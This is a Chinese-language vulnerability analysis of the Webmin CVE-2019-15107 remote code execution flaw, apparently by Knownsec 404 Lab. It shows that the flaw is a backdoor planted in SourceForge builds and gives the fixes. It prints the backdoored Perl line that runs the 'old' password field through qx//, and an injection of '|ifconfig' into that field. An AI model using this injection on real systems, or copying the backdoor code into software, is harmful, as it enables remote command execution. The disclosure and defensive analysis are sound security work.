> 原文链接: https://www.anquanke.com//post/id/184764 


# Webmin（CVE-2019-15107）远程代码执行漏洞之backdoor探究


                                阅读量   
                                **463787**
                            
                        |
                        
                                                                                    



[![](https://p4.ssl.qhimg.com/t015e878453e7e6d3e8.jpg)](https://p4.ssl.qhimg.com/t015e878453e7e6d3e8.jpg)



作者：Ethan@知道创宇404实验室

## 漏洞概述

Webmin是一个基于Web的界面，用于Unix的系统管理。使用任何支持表和表单的浏览器，可以设置用户帐户，Apache，DNS，文件共享等。

2019年8月10日，在pentest上发布了Webmin CVE-2019-15107远程代码执行漏洞。

该漏洞由于password_change.cgi文件在重置密码功能中存在一个代码执行漏洞，该漏洞允许恶意第三方在缺少输入验证的情况下而执行恶意代码，后经知道创宇404实验室发现，该漏洞的存在实则是sourceforge上某些版本的安装包和源码被植入了后门导致的。



## 漏洞复现

官方给的漏洞影响版本为Webmin&lt;=1.920，于是当晚我使用了Webmin 1.920的版本进行的测试。

在1.920版本中漏洞的触发需要开启密码重置功能，“Webmin-&gt; Webmin Configuration-&gt; Authentication”下把允许用户使用旧密码设置新密码的选项给选上，并保存！

[![](https://p3.ssl.qhimg.com/dm/1024_254_/t01386132c44a786f8e.png)](https://p3.ssl.qhimg.com/dm/1024_254_/t01386132c44a786f8e.png)

Webmin重启后，查看webmin的配置文件，可以发现passwd_mode的值已经从0变为了2

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/1024_660_/t01c155953cc684cac0.png)

然后在密码修改处处执行抓包，然后在old参数上加上|ifconfig

[![](https://p0.ssl.qhimg.com/dm/1024_306_/t01872bd86228b151bd.png)](https://p0.ssl.qhimg.com/dm/1024_306_/t01872bd86228b151bd.png)

发现成功执行了命令！

想着换个用户试试吧，23333，结果出现下面的情况！

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_302_/t01b1fcddd4c322eff6.png)

为什么换个root用户就不行了，这里的root用户是Linux系统的root用户，我登陆使用的就是这个用户。。

我再随便使用个用户试试？

[![](https://p2.ssl.qhimg.com/dm/1024_275_/t01acfd73bb8afea40a.png)](https://p2.ssl.qhimg.com/dm/1024_275_/t01acfd73bb8afea40a.png)

经测试用户为空也可以，用户为webmin用户也可以，其创建方式如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_288_/t01b826c46fb82d5013.png)

其中root是Linux系统账户，认证方式为Unix authenticaton，ethan账户是自己创建的webmin 账户，认证方式无。

这样问题就来了，为什么会有这样的区别？这就不得不开启一个perl菜鸟审计perl代码的道路，感谢@Longofo的帮助！



## 漏洞点分析

首先在password_change.cgi的第12行，我们可以得知想触发漏洞必须passwd_mode=2，也就必须开启密码重置功能。否则就会显示Password changing is not enabled!

```
$miniserv`{`'passwd_mode'`}` == 2 || die "Password changing is not enabled!";
```

接着分析password_change.cgi的12行到31行，如下：

```
# Is this a Webmin user?
if (&amp;foreign_check("acl")) `{`
    &amp;foreign_require("acl", "acl-lib.pl");
    ($wuser) = grep `{` $_-&gt;`{`'name'`}` eq $in`{`'user'`}` `}` &amp;acl::list_users();
    if ($wuser-&gt;`{`'pass'`}` eq 'x') `{`
        # A Webmin user, but using Unix authentication
        $wuser = undef;
        `}`
    elsif ($wuser-&gt;`{`'pass'`}` eq '*LK*' ||
           $wuser-&gt;`{`'pass'`}` =~ /^\!/) `{`
        &amp;pass_error("Webmin users with locked accounts cannot change ".
                    "their passwords!");
        `}`
    `}`
```

从注释看，这段代码主要判断是不是webmin user。并且请求了一个acl-lib.pl，看名字就知道是功能性文件，功能应该就是访问控制之类的。在第21~22行的作用是获取请求中的user，并且判断是否属于Webmin user！但是这个x让我不知所然，为什么把$wuser和x这个值比较呢？。于是我把acl::list_users()的值尝试着打印出来！

[![](https://p2.ssl.qhimg.com/dm/1024_462_/t01f0c044cbf7a4a536.png)](https://p2.ssl.qhimg.com/dm/1024_462_/t01f0c044cbf7a4a536.png)

返回如下数据：

[![](https://p4.ssl.qhimg.com/t013a9f40ffdb2bf00f.png)](https://p4.ssl.qhimg.com/t013a9f40ffdb2bf00f.png)

[![](https://p1.ssl.qhimg.com/dm/1024_560_/t01c75923c3e4e2a41f.png)](https://p1.ssl.qhimg.com/dm/1024_560_/t01c75923c3e4e2a41f.png)

通过返回的数据，我们可以知道root用户并且使用Unix authenticaton设置(默认)的pass的值为x，而我自己创建没有选择认证方式的用户，pass的值为一串加密的字符串。也就是说如果我们传进的user是系统用户登陆且认证方式为Unix authenticaton的账户时，$wuser 的值会被赋值为undef。

在if条件语句外，我们把$wuser的值给打印下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0189c6bd7e26350b52.png)

[![](https://p3.ssl.qhimg.com/dm/1024_259_/t01412209c593379783.png)](https://p3.ssl.qhimg.com/dm/1024_259_/t01412209c593379783.png)

在if条件语句里面把$wuser 的值打印出来印证一下

[![](https://p0.ssl.qhimg.com/t0136bce0ef68aef761.png)](https://p0.ssl.qhimg.com/t0136bce0ef68aef761.png)

[![](https://p5.ssl.qhimg.com/dm/1024_343_/t0193b95b308608bb83.png)](https://p5.ssl.qhimg.com/dm/1024_343_/t0193b95b308608bb83.png)

而在perl语言中undef是变量未初始化时的默认值，一般情况下，将其当作空或0就好了，在需要作为数值的时候，undef代表的就是0，需要字符串的时候，undef就是空字符串。这里应该是对系统用户密码的修改和其它用户进行了区分。

由我们上面的分析可知，在用户为root的情况下$wuser的值为undef。

```
if ($wuser) `{`
    # Update Webmin user's password
    $enc = &amp;acl::encrypt_password($in`{`'old'`}`, $wuser-&gt;`{`'pass'`}`);
    $enc eq $wuser-&gt;`{`'pass'`}` || &amp;pass_error($text`{`'password_eold'`}`,qx/$in`{`'old'`}`/);
    $perr = &amp;acl::check_password_restrictions($in`{`'user'`}`, $in`{`'new1'`}`);
    $perr &amp;&amp; &amp;pass_error(&amp;text('password_enewpass', $perr));
    $wuser-&gt;`{`'pass'`}` = &amp;acl::encrypt_password($in`{`'new1'`}`);
    $wuser-&gt;`{`'temppass'`}` = 0;
    &amp;acl::modify_user($wuser-&gt;`{`'name'`}`, $wuser);
    &amp;reload_miniserv();
    `}`
```

也就是说如果传入的user为系统用户无法进入第37行的if条件语句，从而无法执行第40行qx/…../的命令执行代码。当我们传入的用户为空或者不存在时，$wuser的值为`{``}`，但是会进入if条件语句

[![](https://p5.ssl.qhimg.com/dm/1024_381_/t0161041121982bbbcf.png)](https://p5.ssl.qhimg.com/dm/1024_381_/t0161041121982bbbcf.png)

关于命令执行是否需要|，我们通过分析第207行到217行的pass_error可知，不需要|，亦可进行命令执行回显。

```
sub pass_error
`{`
&amp;header(undef, undef, undef, undef, 1, 1);
print &amp;ui_hr();

print "&lt;center&gt;&lt;h3&gt;",$text`{`'password_err'`}`," : ",@_,"&lt;/h3&gt;&lt;/center&gt;\n";

print &amp;ui_hr();
&amp;footer();
exit;
`}`
```

[![](https://p3.ssl.qhimg.com/dm/1024_282_/t0161beab0f20889e56.png)](https://p3.ssl.qhimg.com/dm/1024_282_/t0161beab0f20889e56.png)



## 另有蹊跷

继续探究的原因是觉得qx/…./的蹊跷，因为官方给的修补是直接删除了qx/…./如图：

[![](https://p3.ssl.qhimg.com/dm/1024_134_/t01a17aea399db1291b.png)](https://p3.ssl.qhimg.com/dm/1024_134_/t01a17aea399db1291b.png)

是不是越看越感觉这个漏洞是被”加上去的”，在Github上下载的1.920版本并无qx/…./，啊咧咧，一头雾水啊。。。通过git log -p命令并未发现与qx/…./相关的记录。而在sourceforge上下载的源码和安装包却有漏洞代码。后门？

2012年在网站SourceForge韩国CDN节点疑似被入侵，热门下载资源phpMyadmin被植入后门。在Seebug上有收录：[https://www.seebug.org/vuldb/ssvid-60402](https://www.seebug.org/vuldb/ssvid-60402)

[![](https://p4.ssl.qhimg.com/dm/1024_333_/t01a3693ea5aa547b62.png)](https://p4.ssl.qhimg.com/dm/1024_333_/t01a3693ea5aa547b62.png)

在Github上找到另外一些讯息，[https://github.com/webmin/webmin/issues/947](https://github.com/webmin/webmin/issues/947)

[![](https://p0.ssl.qhimg.com/dm/1024_554_/t01c0382f923acf0d37.png)](https://p0.ssl.qhimg.com/dm/1024_554_/t01c0382f923acf0d37.png)

在1.890版本中，同样存在漏洞代码，这一次简直是赤裸裸的后门。。。

我从sourceforge下载1.890版本，进行了探究。漏洞点如下：

[![](https://p3.ssl.qhimg.com/dm/1024_262_/t015f5b0626c678f9c3.png)](https://p3.ssl.qhimg.com/dm/1024_262_/t015f5b0626c678f9c3.png)

通过分析我们可以得知，这个漏洞点的触发只需要传一个expired参数执行命令即可。不需要之前的passwd_mode=2的必要条件。

[![](https://p5.ssl.qhimg.com/dm/1024_311_/t01d0aff18dbad21c7d.png)](https://p5.ssl.qhimg.com/dm/1024_311_/t01d0aff18dbad21c7d.png)

也就是说，在1.890版本中漏洞的触发不需要任何依赖。是代码疏漏还是恶意后门？



## 验证想法

这里我们通过更直观的方式来验证，通过把Github和sourceforge的源码下载下来，然后进行diff

Webmin 1.920版本的password_change.cgi文件

[![](https://p2.ssl.qhimg.com/dm/1024_316_/t014524519d3ef01b51.png)](https://p2.ssl.qhimg.com/dm/1024_316_/t014524519d3ef01b51.png)

Webmin 1.890版本的password_change.cgi文件

[![](https://p1.ssl.qhimg.com/dm/1024_196_/t010df46bf4525e95f5.png)](https://p1.ssl.qhimg.com/dm/1024_196_/t010df46bf4525e95f5.png)

通过Github和sourceforge的文件对比，我们可以发现，sourceforge的代码明显存在问题，极有可能是被植入了后门。

后经验证确认，只有sourceforge的代码和安装包存在后门漏洞。各版本的情况如下：

[![](https://p0.ssl.qhimg.com/t0198c627f1a58546fa.png)](https://p0.ssl.qhimg.com/t0198c627f1a58546fa.png)

其中以1.890版本的后门漏洞触发依赖最小，危害最大！猜测这应该是最初始的后门，后来植入后门的时候没有考虑到代码逻辑的问题，导致漏洞触发受到了限制！



## 漏洞修补
- 直接升级到1.930版本
- 临时修补方案，可以定位漏洞代码所在的行，然后剔除，下图为1.920版本：
[![](https://p5.ssl.qhimg.com/dm/1024_282_/t0129c2ffdb379e37c9.png)](https://p5.ssl.qhimg.com/dm/1024_282_/t0129c2ffdb379e37c9.png)

下图为1.890版本：

[![](https://p1.ssl.qhimg.com/dm/1024_300_/t01085317ee5b4ca03d.png)](https://p1.ssl.qhimg.com/dm/1024_300_/t01085317ee5b4ca03d.png)

将所示标注替换为$miniserv`{`‘passwd_mode’`}` == 2 || die “Password changing is not enabled!”;即可，替换的代码为Github无后门代码。



## 事后感想

本来正常的一次应急没想到，发展成了对后门文件的探究。果然是生活不息，搞事不止啊！感谢@Longofo，帮忙测试大量文件和代码。黑哥也在medium上发表了The stories behind Webmin CVE-2019–15107这篇文章来描述后门发现的过程：[https://medium.com/@80vul/the-stories-behind-cve-2012-5159-198eaad2449d](https://medium.com/@80vul/the-stories-behind-cve-2012-5159-198eaad2449d)
